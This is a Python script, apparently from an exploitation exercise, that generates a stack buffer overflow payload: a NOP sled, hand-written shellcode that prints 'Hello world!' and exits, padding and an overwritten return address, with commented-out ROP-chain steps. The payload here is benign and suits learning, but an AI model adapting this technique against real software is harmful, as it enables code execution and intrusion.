import argparse
from struct import *


# with open('payload.txt', 'w') as f:
#     f.write()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generator for payload')
    parser.add_argument(
        '-b', 
        help='number of buffer bytes before',
        type=int,
    )
    parser.add_argument(
        '-s',
        help='string to print out',
        type=str
    )
    parser.add_argument(
        '-g',
        help='gadget address',
        type=str,
    )
    parser.add_argument(
        '-sa',
        help='string address',
        type=str,
    )
    parser.add_argument(
        '-p',
        help='printf address',
        type=str
    )
    parser.add_argument(
        '-e',
        help='exit address',
        type=str,
    )

    args = parser.parse_args()
    
    overall_payload = b''

    SLED_LENGTH = 24

    NOP_SLED = b'\x90' * SLED_LENGTH
    
    # command to push, call, then pop
    BUFFER = b"\xe9\x1e\x00\x00\x00"  
    BUFFER += b"\xb8\x04\x00\x00\x00"  
    BUFFER += b"\xbb\x01\x00\x00\x00"  
    BUFFER += b"\x59"                  
    BUFFER += b"\xba\x0f\x00\x00\x00"  
    BUFFER += b"\xcd\x80"              
    BUFFER += b"\xb8\x01\x00\x00\x00"  
    BUFFER += b"\xbb\x00\x00\x00\x00"  
    BUFFER += b"\xcd\x80"              
    BUFFER += b"\xe8\xdd\xff\xff\xff"  
    BUFFER += bytes("Hello world!\n".encode())

    # COMMAND = pack("<Q", 0x00005555555551c5)
    # COMMAND += bytes("Hello world!".encode())
    # print(len(BUFFER))

    PADDING = 'X' * (72 - SLED_LENGTH - len(BUFFER))
    print('padding len:',len(PADDING))
    # print('buffer:', len(BUFFER))

    RIP = pack("<Q", 0x555555559670)
    
    print('RIP:', len(RIP))

    # In order: NOP sled, command, buffer, RIP addr to NOP sled
    overall_payload += NOP_SLED
    # overall_payload += COMMAND
    overall_payload += BUFFER
    overall_payload += bytes(PADDING.encode())
    overall_payload += RIP

    print('length:', len(overall_payload))

    # # add buffer
    # buff = args.b
    # if buff is None:
    #     buff = 72
    # overall_payload += bytes(int(buff) * 'C'.encode())
    
    # pop rdi?
    # overall_payload += pack("<Q", 0x00007ffff7df705a)

    # printf function here
    # overall_payload += pack("<Q", 0x7ffff7e2d8f0)
    
    # overall_payload += bytes("hello world!".encode())

    # after padding
    # overall_payload += ""

    # # add string
    # to_print = args.s
    # if args.s is not None:
    #     overall_payload += to_print

    # # add gadget address
    # if args.g is not None:
    #     overall_payload += str(args.g)

    # # add string address
    # if args.sa is not None:
    #     overall_payload += str(args.sa)

    # # add printf address
    # if args.p is not None:
    #     overall_payload += str(args.p)

    # # add exit address
    # if args.e is not None:
    #     overall_payload += str(args.e)

    with open('generated.txt', 'wb') as f:
        f.write(overall_payload)

    print(overall_payload)
